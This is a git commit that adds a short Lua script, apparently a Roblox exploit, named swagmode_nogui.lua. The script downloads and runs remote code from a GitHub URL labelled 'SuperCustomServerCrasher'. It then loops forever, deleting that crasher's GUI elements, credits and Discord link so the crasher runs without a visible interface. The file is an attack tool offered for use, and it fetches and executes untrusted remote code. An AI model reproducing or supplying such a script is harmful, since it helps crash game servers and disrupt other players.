6a5f66a6d7e9855a3e1edb0d29a6d1371fdb2bfe
Chiiicken <65784006+Chiiicken5538@users.noreply.github.com>
2022-06-22 21:43:18 +0200

    Create swagmode_nogui.lua

---
+++ swagmode_nogui.lua
@@ -0,0 +1,13 @@
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+
+while wait() do 
+		if game:GetService("CoreGui"):FindFirstChild("SwagmodeCrasher") then
+		
+			game:GetService("CoreGui").SwagmodeCrasher["made_by_Lerk#7643"].NewMethod:Destroy()
+			game:GetService("CoreGui").SwagmodeCrasher["made_by_Lerk#7643"].Alright:Destroy()
+			game:GetService("CoreGui").SwagmodeCrasher["made_by_Lerk#7643"].CrashFrame.Title:Destroy()
+			game:GetService("CoreGui").SwagmodeCrasher["made_by_Lerk#7643"].CrashFrame["Discord, which is discord.gg/Swaggest"]:Destroy()
+			game:GetService("CoreGui").SwagmodeCrasher["made_by_Lerk#7643"].CrashFrame.BackgroundTransparency = 1
+		end
+end
